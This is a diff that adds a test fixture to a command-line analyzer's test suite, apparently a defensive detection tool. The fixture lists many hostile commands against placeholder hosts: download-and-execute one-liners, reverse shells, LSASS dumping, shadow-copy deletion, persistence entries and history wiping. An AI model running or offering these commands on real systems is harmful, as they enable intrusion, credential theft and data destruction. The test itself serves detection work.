@@ -866,6 +866,65 @@ async function main() {
     assert.ok(r.iocs.length >= 1, 'URL must still be offered as a pivot');
   });
 
+  // Inert demo blob: documentation-only indicators (example.invalid,
+  // 192.0.2.0/24), every technique spelled out once. Pasting it into the
+  // analyzer must fire the whole rule bank — a new rule that this blob
+  // misses has no fixture and probably no test either.
+  const inertCmdlineBlob = [
+    'cmd /c powershell -nop -w hidden -encodedcommand ' + Buffer.from('Write-Host "inert demo payload - nothing executes" '.repeat(6).trim(), 'utf16le').toString('base64'),
+    'iNvOkE-eXpReSsIoN (New-Object Net.WebClient).DownloadString("http://cdn.example.invalid/p.ps1")',
+    '[System.Convert]::FromBase64String("aGVsbG8=")',
+    'Invoke-WebRequest http://stage.example.invalid/a.ps1 | iex',
+    'iex ("Wr"+"apper")',
+    'I`n`voke-Expression demo',
+    'certutil -urlcache -f http://stage.example.invalid/p.exe %TEMP%\\p.exe',
+    'bitsadmin /transfer j http://stage.example.invalid/j.exe %TEMP%\\j.exe',
+    'msiexec /q /i http://stage.example.invalid/m.msi',
+    'mshta javascript:window.close',
+    'rundll32 javascript:"..\\..\\demo"',
+    'rundll32 url.dll,OpenURL http://stage.example.invalid',
+    'regsvr32 /i:http://stage.example.invalid/s.sct scrobj.dll',
+    'wmic process call create x.exe',
+    'installutil /logfile= u.dll',
+    'wscript //b //nologo s.js',
+    'schtasks /create /tn t /tr %TEMP%\\t.exe /sc onlogon',
+    'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v v /d %TEMP%\\v.exe',
+    'vssadmin delete shadows /all /quiet',
+    'bcdedit /set {default} recoveryenabled no',
+    'procdump -ma lsass.exe lsass.dmp',
+    'net user svc_backup Passw0rd! /add',
+    'whoami /all & systeminfo & net view & tasklist /v & nltest /domain_trusts & dsquery user',
+    'klist purge',
+    'CuRl -s http://stage.example.invalid/x.sh | sudo bash',
+    'wget -qO- http://stage.example.invalid/y.sh | sh',
+    'c^u^r^l -s http://stage.example.invalid/z.sh | b^a^s^h',
+    'bash -i >& /dev/tcp/192.0.2.10/4444 0>&1',
+    'nc -e /bin/sh 192.0.2.10 4444',
+    'echo aGVsbG8= | base64 -d | sh',
+    'printf 6869 | xxd -r -p | sh',
+    "python -c \"import base64;exec(base64.b64decode('aGVsbG8='))\"",
+    'chmod +x /tmp/x.sh && /dev/shm/run.sh',
+    'crontab -e && systemctl enable demo && cat /etc/rc.local && ls /etc/cron.d/',
+    'cat ~/.ssh/id_rsa > /dev/null',
+    'curl -s http://stage.example.invalid/b -o /usr/bin/b',
+    'history -c ; shred -u ~/.bash_history ; unset HISTFILE',
+    'REM ' + Buffer.from('SAMPLE').toString('base64').replace(/=+$/, '').repeat(80),
+  ].join('\n');
+
+  await test('cmdline: inert demo blob fires every rule in the bank', () => {
+    const r = toolkit.analyzeCommandLine(inertCmdlineBlob);
+    const fired = new Set(r.matched.map((m) => m.id));
+    const missing = toolkit.CMDLINE_RULES.filter((rule) => !fired.has(rule.id)).map((rule) => rule.id);
+    assert.strictEqual(missing.join(','), '', 'rules without a fixture');
+    assert.strictEqual(r.verdict, 'malicious');
+    assert.strictEqual(r.score, 100);
+    // Every obfuscation finding plus the decoded-payload block.
+    for (const title of ['Caret insertion', 'Backtick escaping', 'Mixed-case spelling', 'Decoded Base64 payload']) {
+      assert.ok(r.findings.some((f) => f.title.startsWith(title)), title + ' finding missing');
+    }
+    assert.ok(r.iocs.length >= 5, 'blob must yield pivot indicators');
+  });
+
   console.log(' [PASS] Command Line Analyzer');
 
   console.log('\nTest Summary:');
